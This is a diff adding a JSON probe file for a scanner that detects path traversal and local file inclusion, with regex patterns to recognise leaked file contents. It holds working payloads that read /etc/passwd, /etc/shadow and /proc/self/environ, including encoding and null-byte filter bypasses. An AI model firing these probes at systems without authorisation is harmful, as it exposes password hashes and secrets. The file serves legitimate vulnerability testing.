@@ -1,0 +1,197 @@
+{
+  "meta": {
+    "description": "Safe path traversal / LFI probe sequences for detecting directory traversal vulnerabilities. These payloads attempt to read well-known read-only OS files (e.g. /etc/passwd, win.ini). No destructive operations are performed.",
+    "safe": true,
+    "references": [
+      "https://owasp.org/www-community/attacks/Path_Traversal",
+      "https://portswigger.net/web-security/file-path-traversal",
+      "https://cwe.mitre.org/data/definitions/22.html"
+    ]
+  },
+  "probes": [
+    {
+      "id": "unix_depth1",
+      "value": "../etc/passwd",
+      "os": "unix",
+      "depth": 1,
+      "description": "Single-level traversal to /etc/passwd"
+    },
+    {
+      "id": "unix_depth2",
+      "value": "../../etc/passwd",
+      "os": "unix",
+      "depth": 2,
+      "description": "Two-level traversal to /etc/passwd"
+    },
+    {
+      "id": "unix_depth3",
+      "value": "../../../etc/passwd",
+      "os": "unix",
+      "depth": 3,
+      "description": "Three-level traversal to /etc/passwd"
+    },
+    {
+      "id": "unix_depth4",
+      "value": "../../../../etc/passwd",
+      "os": "unix",
+      "depth": 4,
+      "description": "Four-level traversal to /etc/passwd (covers most web roots)"
+    },
+    {
+      "id": "unix_depth5",
+      "value": "../../../../../etc/passwd",
+      "os": "unix",
+      "depth": 5,
+      "description": "Five-level traversal to /etc/passwd"
+    },
+    {
+      "id": "unix_depth6",
+      "value": "../../../../../../etc/passwd",
+      "os": "unix",
+      "depth": 6,
+      "description": "Six-level traversal to /etc/passwd"
+    },
+    {
+      "id": "unix_depth8",
+      "value": "../../../../../../../../etc/passwd",
+      "os": "unix",
+      "depth": 8,
+      "description": "Deep traversal for applications with deep document roots"
+    },
+    {
+      "id": "unix_absolute",
+      "value": "/etc/passwd",
+      "os": "unix",
+      "depth": 0,
+      "description": "Absolute path injection (no traversal sequences)"
+    },
+    {
+      "id": "unix_shadow",
+      "value": "../../../../etc/shadow",
+      "os": "unix",
+      "depth": 4,
+      "description": "Shadow password file — readable only by root/shadow group"
+    },
+    {
+      "id": "unix_proc_self_environ",
+      "value": "../../../../proc/self/environ",
+      "os": "unix",
+      "depth": 4,
+      "description": "Process environment — may expose secrets in environment variables"
+    },
+    {
+      "id": "unix_url_encoded_slash",
+      "value": "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
+      "os": "unix",
+      "depth": 4,
+      "description": "URL-encoded forward-slash variant to bypass naive input filters"
+    },
+    {
+      "id": "unix_double_url_encoded",
+      "value": "..%252F..%252F..%252F..%252Fetc%252Fpasswd",
+      "os": "unix",
+      "depth": 4,
+      "description": "Double-URL-encoded variant to bypass single-decode filters"
+    },
+    {
+      "id": "unix_null_byte",
+      "value": "../../../../etc/passwd%00",
+      "os": "unix",
+      "depth": 4,
+      "description": "Null-byte injection to truncate a forced extension suffix (PHP < 5.4)"
+    },
+    {
+      "id": "unix_null_byte_dotphp",
+      "value": "../../../../etc/passwd%00.php",
+      "os": "unix",
+      "depth": 4,
+      "description": "Null-byte with .php extension bypass (legacy PHP)"
+    },
+    {
+      "id": "unix_mixed_slash",
+      "value": "....//....//....//....//etc/passwd",
+      "os": "unix",
+      "depth": 4,
+      "description": "Double-dot with double-slash to bypass simple '../' strip filters"
+    },
+    {
+      "id": "windows_depth2",
+      "value": "..\\..\\windows\\win.ini",
+      "os": "windows",
+      "depth": 2,
+      "description": "Two-level Windows traversal targeting win.ini"
+    },
+    {
+      "id": "windows_depth4",
+      "value": "..\\..\\..\\..\\windows\\win.ini",
+      "os": "windows",
+      "depth": 4,
+      "description": "Four-level Windows traversal targeting win.ini"
+    },
+    {
+      "id": "windows_depth4_forward",
+      "value": "../../../../windows/win.ini",
+      "os": "windows",
+      "depth": 4,
+      "description": "Four-level Windows traversal using forward slashes"
+    },
+    {
+      "id": "windows_system32_drivers_etc_hosts",
+      "value": "../../../../windows/system32/drivers/etc/hosts",
+      "os": "windows",
+      "depth": 4,
+      "description": "Windows hosts file — universally readable, confirms traversal"
+    },
+    {
+      "id": "windows_url_encoded_backslash",
+      "value": "..%5C..%5C..%5C..%5Cwindows%5Cwin.ini",
+      "os": "windows",
+      "depth": 4,
+      "description": "URL-encoded backslash variant for Windows traversal"
+    }
+  ],
+  "detection_patterns": [
+    {
+      "id": "unix_passwd_root",
+      "pattern": "root:[x*!]:0:0:",
+      "os": "unix",
+      "description": "First line of /etc/passwd: root user entry"
+    },
+    {
+      "id": "unix_passwd_generic",
+      "pattern": "[a-z_][a-z0-9_-]*:[x*!]:[0-9]+:[0-9]+:",
+      "os": "unix",
+      "description": "Generic /etc/passwd line (user:hash:uid:gid:)"
+    },
+    {
+      "id": "unix_shadow_hash",
+      "pattern": "root:\\$[156y]\\$",
+      "os": "unix",
+      "description": "/etc/shadow root entry — MD5/SHA-512/yescrypt hash"
+    },
+    {
+      "id": "unix_proc_environ",
+      "pattern": "PATH=|HOME=/|USER=|LANG=",
+      "os": "unix",
+      "description": "Process environment variable block from /proc/self/environ"
+    },
+    {
+      "id": "windows_win_ini_extensions",
+      "pattern": "\\[extensions\\]",
+      "os": "windows",
+      "description": "[extensions] section header from win.ini"
+    },
+    {
+      "id": "windows_win_ini_fonts",
+      "pattern": "\\[fonts\\]",
+      "os": "windows",
+      "description": "[fonts] section header from win.ini"
+    },
+    {
+      "id": "windows_hosts_localhost",
+      "pattern": "127\\.0\\.0\\.1\\s+localhost",
+      "os": "windows",
+      "description": "Loopback entry in Windows/Unix hosts file"
+    }
+  ]
+}
